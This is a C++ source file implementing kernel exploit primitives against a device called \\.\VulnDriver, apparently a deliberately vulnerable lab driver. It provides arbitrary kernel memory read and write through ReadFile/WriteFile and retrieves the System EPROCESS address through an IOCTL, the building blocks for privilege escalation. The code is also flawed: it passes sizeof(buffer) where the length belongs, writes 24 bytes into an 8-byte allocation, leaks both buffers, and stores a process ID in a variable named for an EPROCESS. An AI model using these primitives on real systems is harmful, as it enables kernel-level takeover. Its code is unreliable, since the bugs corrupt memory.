#include "VulnerableDriverReadWrite.h"


void VulnerableDriver::EnablePrimitives() {
	
	printf(" [*] Attempting to get Device Handle\n");

	hDevice = CreateFileW(L"\\\\.\\VulnDriver", GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf(" [!] Failed to get device handle! Error Code 0x%X\n", GetLastError());
		return;
	}

	exploitEPROCESS = GetCurrentProcessId();

	primitivesEnabled = true;
}


void VulnerableDriver::Read(UINT64* iDestinationAddr, UINT64 iTargetAddr, UINT64 iSize) {
	if (!primitivesEnabled) {
		std::cout << " [-] Primitives not enabled yet!" << std::endl;
		return;
	}

	char* buffer = new char[0x200];
	DWORD bytesRead;


	*((UINT64*)buffer) = iSize;
	*((UINT64*)(buffer + sizeof(UINT64))) = iTargetAddr;


	bool status = ReadFile(hDevice, buffer, sizeof(buffer), &bytesRead, 0);

	memcpy(iDestinationAddr, buffer, iSize);
}



void VulnerableDriver::Write(BYTE* iDestinationAddr, UINT64 data) {
	
	if (!primitivesEnabled) {
		std::cout << " [-] Primitives not enabled yet!" << std::endl;
		return;
	}


	char* buffer = new char[0x8];
	DWORD bytesWritten;


	*((UINT64*)buffer) = 0x8;
	*((UINT64*)(buffer + sizeof(UINT64))) = *(UINT64*)iDestinationAddr;


	memcpy(buffer + sizeof(UINT64) * 2, &data, 0x8);


	bool status = WriteFile(hDevice, buffer, sizeof(buffer), &bytesWritten, 0);
}


UINT64 VulnerableDriver::GetEPROCESS() {
	if (!primitivesEnabled) {
		std::cout << " [-] Primitives not enabled yet!" << std::endl;
		return 0;
	}
	UINT64 systemProcessAddress = NULL;
	DWORD bytesReturned = 0;


	// 4. Send the request
	BOOL success = DeviceIoControl(
		hDevice,                      // Device handle
		IOCTL_GET_FIRST_EPROCESS,     // The control code
		NULL,                         // Input buffer (None needed)
		0,                            // Input buffer size
		&systemProcessAddress,        // Output buffer (Where the driver writes the address)
		sizeof(UINT64),                // Output buffer size (8 bytes on x64)
		&bytesReturned,               // How many bytes the driver actually wrote
		NULL                          // Not using overlapped (async) I/O
	);

	return systemProcessAddress;
}

void VulnerableDriver::CleanUp() {
	primitivesEnabled = false;
}